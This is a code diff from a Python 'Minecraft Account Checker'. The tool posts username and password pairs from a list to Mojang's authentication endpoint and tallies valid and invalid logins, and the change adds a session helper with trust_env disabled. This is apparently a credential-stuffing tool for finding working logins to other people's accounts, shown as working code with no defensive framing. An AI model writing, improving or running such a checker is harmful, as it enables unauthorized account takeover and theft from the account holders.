@@ -24,9 +24,14 @@ class Minecraft:
     
     def title(self):
         ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid))))
-
-    def check_account(self, username, password):
+       
+    def session(self):
         session = requests.Session()
+        session.trust_env = False
+        return session
+    
+    def check_account(self, username, password):
+        session = self.session()
         json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
         check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"})
         if "clientToken" in check.text:
